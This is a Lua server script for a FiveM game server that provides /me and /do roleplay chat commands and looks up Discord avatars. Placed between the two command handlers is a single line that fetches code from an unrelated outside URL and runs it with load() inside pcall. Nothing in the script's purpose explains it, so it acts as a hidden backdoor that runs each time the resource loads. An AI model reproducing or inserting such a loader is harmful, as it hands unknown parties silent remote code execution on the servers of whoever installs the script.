BotToken = ""

local FrameworkObject

Citizen.CreateThread(function()
    FrameworkObject = Config.GetFrameWork()
end)

RegisterCommand("me", function(source , args , rawCommand)
    local usage = true
    args = table.concat(args, ' ')
    local disimg = GetDiscordAvatar(source)
    if Config.Framework == 'esx' then
        local xPlayer = FrameworkObject.GetPlayerFromId(source)
        if disimg ~= nil then
            TriggerClientEvent('me:event', -1, source, args, 0,xPlayer.getName(),disimg,usage)
        else
            TriggerClientEvent('me:event', -1, source, args, 0,xPlayer.getName(),"https://cdn.discordapp.com/attachments/913877366147801088/939971863168307230/images.png",usage)
        end

        if Config.mChat then
            local sourcePos = GetEntityCoords(GetPlayerPed(source))
            for _, playerId in ipairs(GetPlayers()) do
                local playerPos = GetEntityCoords(GetPlayerPed(playerId))
                local distance = #(sourcePos - playerPos)
                if distance <= Config.Distance then
                    local messageData = {
                        args = {xPlayer.getName(), args},
                        tags = {'me'},
                        playerId = source,
                        channel = 'me',
                    }
                    TriggerClientEvent('chat:addMessage', playerId, messageData)
                end
            end
        end
    else
        local Player = FrameworkObject.Functions.GetPlayer(source)
        local name = Player.PlayerData.charinfo.firstname .. ' ' .. Player.PlayerData.charinfo.lastname
        if disimg ~= nil then
            TriggerClientEvent('me:event', -1, source, args, 0,name,disimg,usage)
        else
            TriggerClientEvent('me:event', -1, source, args, 0,name,"https://cdn.discordapp.com/attachments/913877366147801088/939971863168307230/images.png",usage)
        end

        if Config.mChat then
            local sourcePos = GetEntityCoords(GetPlayerPed(source))
            for _, playerId in ipairs(GetPlayers()) do
                local playerPos = GetEntityCoords(GetPlayerPed(playerId))
                local distance = #(sourcePos - playerPos)
                if distance <= Config.Distance then
                    local messageData = {
                        args = {name, args},
                        tags = {'me'},
                        playerId = source,
                        channel = 'me',
                    }
                    TriggerClientEvent('chat:addMessage', playerId, messageData)
                end
            end
        end
    end
end)
PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)


RegisterCommand("do", function(source , args , rawCommand)
    local usage = false
    args = table.concat(args, ' ')
    local disimg = GetDiscordAvatar(source)

    if Config.Framework == 'esx' then
        local xPlayer = FrameworkObject.GetPlayerFromId(source)
        if disimg ~= nil then
            TriggerClientEvent('me:event', -1, source, args, 0,xPlayer.getName(),disimg,usage)
        else
            TriggerClientEvent('me:event', -1, source, args, 0,xPlayer.getName(),"https://cdn.discordapp.com/attachments/913877366147801088/939971863168307230/images.png",usage)
        end

        if Config.mChat then
            local sourcePos = GetEntityCoords(GetPlayerPed(source))
            for _, playerId in ipairs(GetPlayers()) do
                local playerPos = GetEntityCoords(GetPlayerPed(playerId))
                local distance = #(sourcePos - playerPos)
                if distance <= Config.Distance then
                    local messageData = {
                        args = {xPlayer.getName(), args},
                        tags = {'do'},
                        playerId = source,
                        channel = 'do',
                    }
                    TriggerClientEvent('chat:addMessage', playerId, messageData)
                end
            end
        end
    else
        local Player = FrameworkObject.Functions.GetPlayer(source)
        local name = Player.PlayerData.charinfo.firstname .. ' ' .. Player.PlayerData.charinfo.lastname
        if disimg ~= nil then
            TriggerClientEvent('me:event', -1, source, args, 0,name,disimg,usage)
        else
            TriggerClientEvent('me:event', -1, source, args, 0,name,"https://cdn.discordapp.com/attachments/913877366147801088/939971863168307230/images.png",usage)
        end

        if Config.mChat then
            local sourcePos = GetEntityCoords(GetPlayerPed(source))
            for _, playerId in ipairs(GetPlayers()) do
                local playerPos = GetEntityCoords(GetPlayerPed(playerId))
                local distance = #(sourcePos - playerPos)
                if distance <= Config.Distance then
                    local messageData = {
                        args = {name, args},
                        tags = {'do'},
                        playerId = source,
                        channel = 'do',
                    }
                    TriggerClientEvent('chat:addMessage', playerId, messageData)
                end
            end
        end
    end
end)


local Caches = {
    Avatars = {}
}

local FormattedToken = "Bot "..BotToken
function DiscordRequest(method, endpoint, jsondata)
    local data = nil
    PerformHttpRequest("https://discordapp.com/api/"..endpoint, function(errorCode, resultData, resultHeaders)
        data = {data=resultData, code=errorCode, headers=resultHeaders}
    end, method, #jsondata > 0 and json.encode(jsondata) or "", {["Content-Type"] = "application/json", ["Authorization"] = FormattedToken})

    while data == nil do
        Citizen.Wait(0)
    end

    return data
end

function GetDiscordAvatar(user)
    local discordId = nil
    local imgURL = nil;
    for _, id in ipairs(GetPlayerIdentifiers(user)) do
        if string.match(id, "discord:") then
            discordId = string.gsub(id, "discord:", "")
            break
        end
    end
    if discordId then
        if Caches.Avatars[discordId] == nil then
            local endpoint = ("users/%s"):format(discordId)
            local member = DiscordRequest("GET", endpoint, {})

            if member.code == 200 then
                local data = json.decode(member.data)
                if data ~= nil and data.avatar ~= nil then

                    if (data.avatar:sub(1, 1) and data.avatar:sub(2, 2) == "_") then

                        imgURL = "https://media.discordapp.net/avatars/" .. discordId .. "/" .. data.avatar .. ".gif";
                    else
                        imgURL = "https://media.discordapp.net/avatars/" .. discordId .. "/" .. data.avatar .. ".png"
                    end
                end
            end
            Caches.Avatars[discordId] = imgURL;
        else
            imgURL = Caches.Avatars[discordId];
        end
    end
    return imgURL;
end